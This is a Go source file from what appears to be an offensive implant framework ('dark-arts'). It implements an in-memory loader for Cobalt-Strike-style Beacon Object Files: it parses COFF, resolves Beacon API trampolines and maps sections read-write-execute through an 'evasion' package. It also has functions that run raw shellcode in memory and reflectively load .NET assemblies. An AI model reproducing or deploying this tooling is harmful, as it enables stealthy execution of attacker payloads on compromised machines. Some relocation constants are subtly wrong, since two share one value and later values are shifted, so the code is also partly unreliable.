//go:build windows && amd64

package bof

import (
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"math"
	"unsafe"

	"dark-arts/pkg/evasion"
	"dark-arts/pkg/reflective"
)

type COFF struct {
	Machine            uint16
	Sections           []*Section
	Symbols            map[string]uint64
	SymbolSections     map[string]uint16 // section index for each symbol (for SECTION reloc)
	UndefinedSymbols   map[string]struct{}
	ResolvedSymbols    map[string]bool // Track which symbols were resolved from undefined
	Entry              uint64
	Base               uintptr // Set after Load(); used by GetSymbol
}

type Section struct {
	Name         string
	Virtual      uint64
	VirtualSize  uint64
	Physical     []byte
	Relocs       []Reloc
	Flags        uint32
	SectionIndex uint16
}

type Reloc struct {
	Offset   uint64
	Type     uint16
	Symbol   string
	Addend   int64
}

const (
	IMAGE_REL_AMD64_ABSOLUTE  = 0x0000
	IMAGE_REL_AMD64_ADDR64    = 0x0001
	IMAGE_REL_AMD64_ADDR32    = 0x0002
	IMAGE_REL_AMD64_ADDR32NB  = 0x0003
	IMAGE_REL_AMD64_REL32     = 0x0004
	IMAGE_REL_AMD64_REL32_1   = 0x0005
	IMAGE_REL_AMD64_REL32_2   = 0x0006
	IMAGE_REL_AMD64_REL32_3   = 0x0007
	IMAGE_REL_AMD64_REL32_4   = 0x0008
	IMAGE_REL_AMD64_REL32_5   = 0x0009
	IMAGE_REL_AMD64_SECTION   = 0x000A
	IMAGE_REL_AMD64_SECREL    = 0x000B
	IMAGE_REL_AMD64_SECREL7   = 0x000C
	IMAGE_REL_AMD64_TOKEN     = 0x000C
	IMAGE_REL_AMD64_SREL32    = 0x000D
	IMAGE_REL_AMD64_PAIR      = 0x000E
	IMAGE_REL_AMD64_SSPAN32   = 0x000F
)

func relocationWriteSize(relType uint16) int {
	switch relType {
	case IMAGE_REL_AMD64_ADDR64:
		return 8
	case IMAGE_REL_AMD64_ADDR32,
		IMAGE_REL_AMD64_ADDR32NB,
		IMAGE_REL_AMD64_REL32,
		IMAGE_REL_AMD64_REL32_1,
		IMAGE_REL_AMD64_REL32_2,
		IMAGE_REL_AMD64_REL32_3,
		IMAGE_REL_AMD64_REL32_4,
		IMAGE_REL_AMD64_REL32_5,
		IMAGE_REL_AMD64_SECREL:
		return 4
	case IMAGE_REL_AMD64_SECTION:
		return 2
	default:
		return 0
	}
}

func addUint64(a, b uint64) (uint64, bool) {
	sum := a + b
	overflow := sum < a || sum < b
	return sum, overflow
}

// ErrRelocOverflow is returned when a relocation displacement exceeds int32 range.
var ErrRelocOverflow = errors.New("bof: relocation displacement exceeds int32 range")

// applyRel32 computes and writes a REL32_N relocation.
//
// Per the PE/COFF spec (IMAGE_REL_AMD64_REL32 through REL32_5):
//
//	disp = SymAddr + Addend - Reloc - (4 + N)
//
// where:
//   - SymAddr = final virtual address of the target symbol
//   - Addend  = existing signed 32-bit displacement at the relocation site
//   - Reloc   = virtual address of the relocation site (where the 4 bytes are written)
//   - N       = built-in offset for the specific relocation type (0..5)
//
// The result is written as a signed 32-bit value. Returns ErrRelocOverflow
// if the result exceeds the int32 range.
func applyRel32(addr, symAddr uintptr, isResolved bool, sectionBase uint64, n int) error {
	// Read existing addend from the displacement field
	addend := int64(*(*int32)(unsafe.Pointer(addr)))

	// Compute base for the relocation site address
	var reloc uint64
	if isResolved {
		reloc = uint64(addr)
	} else {
		reloc = sectionBase
	}

	// PE/COFF formula: disp = SymAddr + Addend - Reloc - (4 + N)
	disp := int64(symAddr) + addend - int64(reloc) - int64(4+n)

	// Signed 32-bit range check: -2147483648 <= disp <= 2147483647
	if disp < math.MinInt32 || disp > math.MaxInt32 {
		return fmt.Errorf("%w: disp=%d (sym=%d, addend=%d, reloc=%d, N=%d)",
			ErrRelocOverflow, disp, symAddr, addend, reloc, n)
	}

	*(*int32)(unsafe.Pointer(addr)) = int32(disp)
	return nil
}

var ErrBadFormat = errors.New("bof: invalid COFF format")

// ParseCOFF parses a COFF object file (BOF) from raw bytes.
func ParseCOFF(data []byte) (*COFF, error) {
	if len(data) < 20 {
		return nil, ErrBadFormat
	}

	machine := binary.LittleEndian.Uint16(data[0:2])
	numSections := binary.LittleEndian.Uint16(data[2:4])
	_ = binary.LittleEndian.Uint32(data[4:8])          // timeDate (unused)
	symbolTableOffset := binary.LittleEndian.Uint32(data[8:12])
	numSymbols := binary.LittleEndian.Uint32(data[12:16])
	optionalHeaderSize := binary.LittleEndian.Uint16(data[16:18])
	_ = binary.LittleEndian.Uint16(data[18:20]) // characteristics (unused)

	_ = optionalHeaderSize // COFF objects typically don't have optional header

	offset := 20

	// Section headers (40 bytes each)
	if offset+int(numSections)*40 > len(data) {
		return nil, ErrBadFormat
	}

	sectionHeaders := make([]pe.SectionHeader, numSections)
	for i := uint16(0); i < numSections; i++ {
		h := data[offset : offset+40]
		name := string(h[0:8])
		for i, c := range name {
			if c == 0 {
				name = name[:i]
				break
			}
		}
		sectionHeaders[i] = pe.SectionHeader{
			Name:                 name,
			VirtualSize:          binary.LittleEndian.Uint32(h[8:12]),
			VirtualAddress:       binary.LittleEndian.Uint32(h[12:16]),
			Size:                 binary.LittleEndian.Uint32(h[16:20]),
			Offset:               binary.LittleEndian.Uint32(h[20:24]),
			PointerToRelocations: binary.LittleEndian.Uint32(h[24:28]),
			PointerToLineNumbers: binary.LittleEndian.Uint32(h[28:32]),
			NumberOfRelocations:  binary.LittleEndian.Uint16(h[32:34]),
			NumberOfLineNumbers:  binary.LittleEndian.Uint16(h[34:36]),
			Characteristics:      binary.LittleEndian.Uint32(h[36:40]),
		}
		offset += 40
	}

	// Read section data
	sectionData := make([][]byte, numSections)
	for i := uint16(0); i < numSections; i++ {
		h := sectionHeaders[i]
		if h.Offset > 0 && h.Size > 0 {
			start := int(h.Offset)
			end := start + int(h.Size)
			if end <= len(data) {
				sectionData[i] = data[start:end]
			}
		}
	}

	// Symbol table
	symbols := make(map[string]uint64)
	symbolSections := make(map[string]uint16)
	undefinedSymbols := make(map[string]struct{})
	if symbolTableOffset > 0 && symbolTableOffset < uint32(len(data)) {
		strTableStart := int(symbolTableOffset) + int(numSymbols)*18
		if strTableStart < len(data) {
			strTable := data[strTableStart:]

			for i := uint32(0); i < numSymbols; i++ {
				symOffset := int(symbolTableOffset) + int(i)*18
				if symOffset+18 > len(data) {
					break
				}
				sym := data[symOffset : symOffset+18]
				nameOffset := binary.LittleEndian.Uint32(sym[0:4])
				value := binary.LittleEndian.Uint32(sym[8:12])
				sectionNumber := int16(binary.LittleEndian.Uint16(sym[12:14]))
				_ = binary.LittleEndian.Uint16(sym[14:16]) // Type (ignored)
				storageClass := sym[16]
				numAux := sym[17]

				name := ""
				if nameOffset == 0 {
					// Name is in string table at offset sym[4:8]
					strOffset := binary.LittleEndian.Uint32(sym[4:8])
					if int(strOffset) < len(strTable) {
						end := strOffset
						for end < uint32(len(strTable)) && strTable[end] != 0 {
							end++
						}
						name = string(strTable[strOffset:end])
					}
				} else {
					// Inline name in first 8 bytes
					name = string(sym[0:8])
					for j, c := range name {
						if c == 0 {
							name = name[:j]
							break
						}
					}
				}

			if storageClass == 2 { // IMAGE_SYM_CLASS_EXTERNAL
				if sectionNumber > 0 {
					// Defined external symbol - compute full RVA
					if name != "" && int(sectionNumber) <= len(sectionHeaders) {
						sectionVA := uint64(sectionHeaders[sectionNumber-1].VirtualAddress)
						symbols[name] = sectionVA + uint64(value)
						symbolSections[name] = uint16(sectionNumber)
					}
				} else if sectionNumber == 0 {
					// Undefined external symbol
					if name != "" {
						undefinedSymbols[name] = struct{}{}
					}
				}
			} else if sectionNumber > 0 && name != "" {
				// All other defined symbols (STATIC, LABEL, etc.) for relocation resolution
				if int(sectionNumber) <= len(sectionHeaders) {
					sectionVA := uint64(sectionHeaders[sectionNumber-1].VirtualAddress)
					symbols[name] = sectionVA + uint64(value)
					symbolSections[name] = uint16(sectionNumber)
				}
			}

				// Skip auxiliary records
				if numAux > 0 {
					i += uint32(numAux)
				}
			}
		}
	}

	// Build sections with relocations
	sections := make([]*Section, numSections)
	for i := uint16(0); i < numSections; i++ {
		h := sectionHeaders[i]
		sec := &Section{
			Name:         h.Name,
			Virtual:      uint64(h.VirtualAddress),
			VirtualSize:  uint64(h.VirtualSize),
			Physical:     sectionData[i],
			Flags:        h.Characteristics,
			SectionIndex: i + 1, // COFF section indices are 1-based
		}

		if h.NumberOfRelocations > 0 && h.PointerToRelocations > 0 {
			relocOffset := int(h.PointerToRelocations)
			for j := uint16(0); j < h.NumberOfRelocations; j++ {
				if relocOffset+10 > len(data) {
					break
				}
				r := data[relocOffset : relocOffset+10]
				offset := binary.LittleEndian.Uint32(r[0:4])
				symIndex := binary.LittleEndian.Uint32(r[4:8])
				relType := binary.LittleEndian.Uint16(r[8:10])

var symName string
				if symIndex < numSymbols {
					symOffset := int(symbolTableOffset) + int(symIndex)*18
					if symOffset+18 <= len(data) {
						sym := data[symOffset : symOffset+18]
						nameOffset := binary.LittleEndian.Uint32(sym[0:4])
						if nameOffset == 0 {
							// String table reference
							strOffset := binary.LittleEndian.Uint32(sym[4:8])
							strTableStart := int(symbolTableOffset) + int(numSymbols)*18
							if int(strOffset) < len(data)-strTableStart {
								end := strOffset
								for end < uint32(len(data)-strTableStart) && data[strTableStart+int(end)] != 0 {
									end++
								}
								symName = string(data[strTableStart+int(strOffset) : strTableStart+int(end)])
							}
						} else {
							// Inline name
							symName = string(sym[0:8])
							for j, c := range symName {
								if c == 0 {
									symName = symName[:j]
									break
								}
							}
						}
					}
				}

				sec.Relocs = append(sec.Relocs, Reloc{
					Offset: uint64(offset),
					Type:   relType,
					Symbol: symName,
				})
				relocOffset += 10
			}
		}
		sections[i] = sec
	}

	// For COFF object files, all sections typically have VirtualAddress=0.
	// Assign unique non-overlapping VAs based on section sizes and alignment.
	//
	// For sections with no physical data (like .bss), compute the required size
	// from the symbols defined in that section, since Microsoft COFF .obj files
	// often report VirtualSize=0 for .bss even though it contains global variables.
	bssSizes := make([]uint64, len(sections))
	for symName, symSecIdx := range symbolSections {
		if int(symSecIdx) <= len(sections) {
			secIdx := int(symSecIdx) - 1
			if len(sections[secIdx].Physical) == 0 {
				// This symbol is in a section with no physical data (.bss).
				// Compute the minimum size needed from the maximum symbol offset.
				symOffset := symbols[symName]
				// The variable occupies at least 1 byte beyond its offset;
				// round up to 8-byte alignment for x64.
				needed := (symOffset + 8 + 7) &^ 7
				if needed > bssSizes[secIdx] {
					bssSizes[secIdx] = needed
				}
			}
		}
	}

	var currentVA uint64
	for i := range sections {
		sec := sections[i]
		// Determine alignment from characteristics (bits 20-23 encode log2 alignment)
		alignShift := uint((sec.Flags >> 20) & 0xF)
		if alignShift == 0 {
			alignShift = 2 // minimum 4-byte alignment
		}
		align := uint64(1) << alignShift
		// Align currentVA
		currentVA = (currentVA + align - 1) &^ (align - 1)
		sec.Virtual = currentVA
		if len(sec.Physical) > 0 {
			currentVA += uint64(len(sec.Physical))
		} else {
			// .bss: use the larger of VirtualSize and the computed symbol range.
			// Microsoft COFF .obj files often report VirtualSize=0 for .bss,
			// so we compute the size from the symbols defined in the section.
			secSize := sec.VirtualSize
			if bssSizes[i] > secSize {
				secSize = bssSizes[i]
			}
			if secSize == 0 {
				secSize = 1 // minimum 1 byte to avoid zero-size section
			}
			sec.VirtualSize = secSize
			currentVA += secSize
		}
	}

	// Recompute symbol addresses with new section VAs.
	// Initially symbols were stored as (oldVA + value), where oldVA=0, so symbols[sym] = value.
	for symName, symSecIdx := range symbolSections {
		if int(symSecIdx) <= len(sections) {
			// The original value stored was just the offset within the section
			offset := symbols[symName]
			symbols[symName] = sections[symSecIdx-1].Virtual + offset
		}
	}

	entry := uint64(0)
	if len(sections) > 0 {
		entry = sections[0].Virtual
	}

	return &COFF{
		Machine:          machine,
		Sections:         sections,
		Symbols:          symbols,
		SymbolSections:   symbolSections,
		UndefinedSymbols: undefinedSymbols,
		Entry:            entry,
	}, nil
}

// ResolveSymbols resolves undefined symbols using the provided resolver map.
// The resolver maps symbol names to their resolved ABSOLUTE addresses (virtual addresses).
// Returns an error if any undefined symbol cannot be resolved.
func (c *COFF) ResolveSymbols(resolver map[string]uintptr) error {
	if c.ResolvedSymbols == nil {
		c.ResolvedSymbols = make(map[string]bool)
	}
	for name := range c.UndefinedSymbols {
		addr, ok := resolver[name]
		if !ok {
			return fmt.Errorf("bof: unresolved external symbol: %s", name)
		}
		c.Symbols[name] = uint64(addr)
		c.ResolvedSymbols[name] = true
	}
	c.UndefinedSymbols = nil // Clear after resolution
	return nil
}

// ResolveBeaconAPIs resolves the standard Beacon API symbols to their
// trampoline entry points. This must be called before Load().
func (c *COFF) ResolveBeaconAPIs() error {
	addrs := trampolineAddrs()

	for name := range c.UndefinedSymbols {
		addr, ok := addrs[name]
		if !ok {
			return fmt.Errorf("bof: unresolved external symbol: %s", name)
		}
		if addr == 0 {
			return fmt.Errorf("bof: trampoline %s has null address", name)
		}
		c.Symbols[name] = uint64(addr)
		if c.ResolvedSymbols == nil {
			c.ResolvedSymbols = make(map[string]bool)
		}
		c.ResolvedSymbols[name] = true
	}
	c.UndefinedSymbols = nil
	return nil
}

// Load allocates memory, copies sections, applies relocations,
// and sets page protections using Windows API.
func (c *COFF) Load() (uintptr, error) {
	var maxAddr uint64
	for _, s := range c.Sections {
		end := s.Virtual + uint64(len(s.Physical))
		// Also account for .bss (VirtualSize > Physical)
		if s.Virtual+s.VirtualSize > end {
			end = s.Virtual + s.VirtualSize
		}
		if end > maxAddr {
			maxAddr = end
		}
	}
	if maxAddr == 0 {
		return 0, errors.New("bof: no sections to load")
	}

	// Ensure all undefined symbols have been resolved
	if c.UndefinedSymbols != nil && len(c.UndefinedSymbols) > 0 {
		var unresolved []string
		for name := range c.UndefinedSymbols {
			unresolved = append(unresolved, name)
		}
		return 0, fmt.Errorf("bof: unresolved external symbols: %v", unresolved)
	}

	// Round up to page size (4KB), minimum 64KB
	pageSize := uintptr(4096)
	allocSize := (uintptr(maxAddr) + pageSize - 1) &^ (pageSize - 1)
	if allocSize < 65536 {
		allocSize = 65536
	}

	// Allocate RW memory.
	// If external symbols were resolved (e.g. Beacon APIs), we must allocate
	// within 2GB of them because COFF uses REL32 (32-bit relative) relocations.
	var base uintptr
	var allocErr error
	if c.ResolvedSymbols != nil && len(c.ResolvedSymbols) > 0 {
		// Find any resolved symbol address as the reference point for near-allocation
		for _, isResolved := range c.ResolvedSymbols {
			if isResolved {
				break
			}
		}
		// Get the actual address from Symbols map - pick first resolved one
		for name, isResolved := range c.ResolvedSymbols {
			if isResolved {
				if addr, ok := c.Symbols[name]; ok {
					refAddr := uintptr(addr)
					base, allocErr = evasion.AllocateVirtualMemoryNear(evasion.CurrentProcess, allocSize, 0x04, refAddr)
					break
				}
			}
		}
	}
	if base == 0 {
		base, allocErr = evasion.AllocateVirtualMemory(evasion.CurrentProcess, allocSize, 0x04) // PAGE_READWRITE
	}
	if allocErr != nil {
		return 0, fmt.Errorf("bof: alloc failed: %w", allocErr)
	}

	// Copy sections
	for _, s := range c.Sections {
		if len(s.Physical) > 0 {
			copy((*[1<<30]byte)(unsafe.Pointer(base+uintptr(s.Virtual)))[:], s.Physical)
		}
	}

	// Apply relocations
	for _, s := range c.Sections {
		for _, r := range s.Relocs {
			writeSize := relocationWriteSize(r.Type)
			if writeSize == 0 {
				return 0, fmt.Errorf("bof: section %s unknown relocation type 0x%x", s.Name, r.Type)
			}
			endOffset, overflow := addUint64(r.Offset, uint64(writeSize))
			if overflow || endOffset > uint64(len(s.Physical)) {
				return 0, fmt.Errorf("bof: section %s relocation offset+size exceeds section", s.Name)
			}

			symAddr, ok := c.Symbols[r.Symbol]
			if !ok {
				return 0, fmt.Errorf("bof: section %s relocation references unresolved symbol %q", s.Name, r.Symbol)
			}
			isResolved := c.ResolvedSymbols != nil && c.ResolvedSymbols[r.Symbol]
			addr := base + uintptr(s.Virtual+r.Offset)
			sectionBase := base + uintptr(s.Virtual)
			switch r.Type {
			case IMAGE_REL_AMD64_ADDR64:
				if isResolved {
					*(*uint64)(unsafe.Pointer(addr)) = symAddr
				} else {
					*(*uint64)(unsafe.Pointer(addr)) = uint64(base + uintptr(symAddr))
				}
			case IMAGE_REL_AMD64_ADDR32:
				if isResolved {
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr)
				} else {
					*(*uint32)(unsafe.Pointer(addr)) = uint32(base + uintptr(symAddr))
				}
			case IMAGE_REL_AMD64_ADDR32NB:
				if isResolved {
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr - uint64(base))
				} else {
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr)
				}
		case IMAGE_REL_AMD64_REL32:
			if err := applyRel32(addr, uintptr(symAddr), isResolved, uint64(s.Virtual+r.Offset), 0); err != nil {
				return 0, fmt.Errorf("bof: section %s reloc at 0x%x: %w", s.Name, r.Offset, err)
			}
			case IMAGE_REL_AMD64_REL32_1:
				if err := applyRel32(addr, uintptr(symAddr), isResolved, uint64(s.Virtual+r.Offset), 1); err != nil {
					return 0, fmt.Errorf("bof: section %s reloc at 0x%x: %w", s.Name, r.Offset, err)
				}
			case IMAGE_REL_AMD64_REL32_2:
				if err := applyRel32(addr, uintptr(symAddr), isResolved, uint64(s.Virtual+r.Offset), 2); err != nil {
					return 0, fmt.Errorf("bof: section %s reloc at 0x%x: %w", s.Name, r.Offset, err)
				}
			case IMAGE_REL_AMD64_REL32_3:
				if err := applyRel32(addr, uintptr(symAddr), isResolved, uint64(s.Virtual+r.Offset), 3); err != nil {
					return 0, fmt.Errorf("bof: section %s reloc at 0x%x: %w", s.Name, r.Offset, err)
				}
			case IMAGE_REL_AMD64_REL32_4:
				if err := applyRel32(addr, uintptr(symAddr), isResolved, uint64(s.Virtual+r.Offset), 4); err != nil {
					return 0, fmt.Errorf("bof: section %s reloc at 0x%x: %w", s.Name, r.Offset, err)
				}
			case IMAGE_REL_AMD64_REL32_5:
				if err := applyRel32(addr, uintptr(symAddr), isResolved, uint64(s.Virtual+r.Offset), 5); err != nil {
					return 0, fmt.Errorf("bof: section %s reloc at 0x%x: %w", s.Name, r.Offset, err)
				}
			case IMAGE_REL_AMD64_SECREL:
				if isResolved {
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr - uint64(sectionBase))
				} else {
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr - s.Virtual)
				}
			case IMAGE_REL_AMD64_SECTION:
				targetSection := c.SymbolSections[r.Symbol]
				if targetSection == 0 {
					targetSection = s.SectionIndex // fallback
				}
				*(*uint16)(unsafe.Pointer(addr)) = targetSection
			}
		}
	}

	// Change protection to RX for executable sections, but since COFF .obj
	// files have .bss and .text sharing pages, protect the entire region as
	// PAGE_EXECUTE_READWRITE (RWX). The BOF needs writable .bss globals.
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base, uintptr(maxAddr), 0x40); err != nil {
		return 0, fmt.Errorf("bof: protect failed: %w", err)
	}

	c.Base = base
	return base + uintptr(c.Entry), nil
}

// GetSymbol returns the address of a symbol by name.
// For loaded COFF objects, returns the runtime address (base + offset).
func (c *COFF) GetSymbol(name string) (uintptr, bool) {
	addr, ok := c.Symbols[name]
	if !ok {
		return 0, false
	}
	// If the symbol was resolved externally (Beacon API), it's already absolute.
	// If loaded (Base set), add base to internal symbols.
	if c.Base != 0 && c.ResolvedSymbols != nil && !c.ResolvedSymbols[name] {
		return c.Base + uintptr(addr), true
	}
	return uintptr(addr), true
}

// ExecuteCOFF loads and executes a BOF (COFF object file) in-memory.
// The BOF entry point should follow the convention: void go(char *args, int length)
// args is a packed buffer, length is the buffer size.
func ExecuteCOFF(coffBytes []byte, functionName string, args []string) (string, error) {
	coff, err := ParseCOFF(coffBytes)
	if err != nil {
		return "", fmt.Errorf("bof: parse failed: %w", err)
	}

	// Resolve Beacon API symbols to their trampolines before loading
	if err := coff.ResolveBeaconAPIs(); err != nil {
		return "", fmt.Errorf("bof: beacon api resolution failed: %w", err)
	}

	entry, err := coff.Load()
	if err != nil {
		return "", fmt.Errorf("bof: load failed: %w", err)
	}

	fnAddr, ok := coff.GetSymbol(functionName)
	if !ok {
		fnAddr = entry
	}

	// Pack arguments into BOF format
	packedArgs := PackArguments(args)
	var argPtr uintptr
	argLen := len(packedArgs)
	if argLen > 0 {
		argPtr = uintptr(unsafe.Pointer(&packedArgs[0]))
	} else {
		argPtr = 0
	}

	// Call the BOF entry point using assembly stub: void go(char *args, int length)
	_ = CallFunc2(fnAddr, argPtr, uintptr(argLen))

	return fmt.Sprintf("BOF %s executed at 0x%x", functionName, fnAddr), nil
}

// ExecuteAssembly loads and executes a .NET assembly in-memory via CLR hosting.
func ExecuteAssembly(assemblyBytes []byte, args []string) (string, error) {
	if len(assemblyBytes) == 0 {
		return "", errors.New("bof: empty assembly")
	}

	mod, err := reflective.Load(assemblyBytes, reflective.Options{Mask: true})
	if err != nil {
		return "", fmt.Errorf("bof: load assembly failed: %w", err)
	}

	return fmt.Sprintf("assembly loaded at 0x%x (CLR hosting not yet implemented)", mod.Base), nil
}

// ExecuteShellcode executes raw shellcode in-memory.
func ExecuteShellcode(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", errors.New("bof: empty shellcode")
	}

	pageSize := uintptr(4096)
	allocSize := (uintptr(len(shellcode)) + pageSize - 1) &^ (pageSize - 1)
	if allocSize < 65536 {
		allocSize = 65536
	}

	base, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, allocSize, 0x04) // PAGE_READWRITE
	if err != nil {
		return "", fmt.Errorf("bof: alloc failed: %w", err)
	}

	copy((*[1<<30]byte)(unsafe.Pointer(base))[:], shellcode)

	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base, uintptr(len(shellcode)), 0x20); err != nil {
		return "", fmt.Errorf("bof: protect failed: %w", err)
	}

	CallFunc0(base)

	return fmt.Sprintf("shellcode executed at 0x%x", base), nil
}